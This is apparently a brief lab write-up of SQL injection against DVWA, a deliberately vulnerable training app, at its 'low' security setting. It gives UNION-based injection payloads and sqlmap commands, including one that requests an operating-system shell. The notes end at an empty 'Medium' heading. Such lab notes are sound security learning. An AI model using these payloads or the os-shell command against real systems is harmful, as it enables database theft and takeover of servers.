## Low
- For low we realised id parameter (GET) was vulnerable and could be easily injected.
```
a' UNION SELECT "lol", @@VERSION ; -- -
a' UNION SELECT "lol", @@VERSION ; -- #

```
- This payload easily worked.
- Next thing I tired was **sqlmap**
- To find injectable parameter 
`sqlmap -u "http://192.168.0.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHP  
SESSID=g832d5mrsta7pm9c1hug0bj8io"`
- To get shell
`sqlmap -u "http://192.168.0.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low;PHP  
SESSID=g832d5mrsta7pm9c1hug0bj8io" --os-shell`

## Medium
